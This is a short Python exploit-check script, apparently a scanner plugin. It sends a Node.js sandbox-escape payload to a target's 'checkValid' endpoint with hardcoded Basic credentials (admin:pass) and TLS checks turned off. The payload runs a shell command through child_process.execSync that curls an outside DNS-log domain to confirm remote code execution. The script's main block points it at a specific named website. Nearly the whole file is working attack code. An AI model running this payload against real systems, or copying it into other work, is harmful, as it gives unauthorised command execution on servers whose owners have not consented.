import requests, re, urllib3
import sys, os

from module.dnslog.getDnslogDomain import getDnslogDomain
from module.dnslog.getDnslogResult import getDnslogResult

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def doCheck(url):
    if url[-1] != '/':
        url = url + "/"
    targetUrl = url + "checkValid"
    gets = getDnslogDomain()
    domain = gets[0]
    token = gets[1]
    body = 'document=this.constructor.constructor(\'return process\')().mainModule.require("child_process").execSync("curl http://' + domain + '")'
    headers = {
        'User-Agent': 'python-requests/2.28.1',
        'Accept': '*/*',
        'Connection': 'close',
        'Authorization': 'Basic YWRtaW46cGFzcw==',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    response = requests.post(targetUrl, body, headers=headers, timeout=20, verify=False)
    if getDnslogResult(token):
        return targetUrl
    else:
        return False


if __name__ == '__main__':
    print(doCheck("https://www.bigschedules.com/"))
